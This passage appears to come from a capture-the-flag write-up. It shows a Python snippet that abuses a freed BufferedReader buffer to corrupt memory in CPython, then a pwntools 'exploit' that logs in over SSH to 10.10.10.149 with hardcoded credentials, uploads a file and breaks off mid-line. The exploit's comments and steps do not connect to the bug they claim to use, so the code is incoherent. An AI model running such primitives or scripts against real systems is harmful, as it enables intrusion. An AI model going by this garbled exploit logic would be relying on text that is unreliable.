import io

class File(io.RawIOBase):
    def readinto(self, buf):
        global view
        view = buf
    def readable(self):
        return True

f = io.BufferedReader(File())
f.read(1)
del f

view.obj.value = 0x1337

f = io.BufferedReader(File())
f.read(1)
del f

print(view.obj.value)
```

## Exploit

The exploit itself is only a few lines of code.

```python
#!/usr/bin/env python3
from pwn import *

#
# We need to create a file in the user's home directory
# with the name "test.txt"
#

#
# Create a file in the current directory
#

f = open("test.txt", "w+")
f.close()

#
# Move the file to the user's home directory
#

context.terminal = ['gnome-terminal', '-e']
sh = ssh(host='10.10.10.149', user='margo', password='iamgod$08')
sh.upload_file("test.txt")

#
# Connect to the server, read the file, and overwrite the
# object's value to 0x1337
#

p = sh.
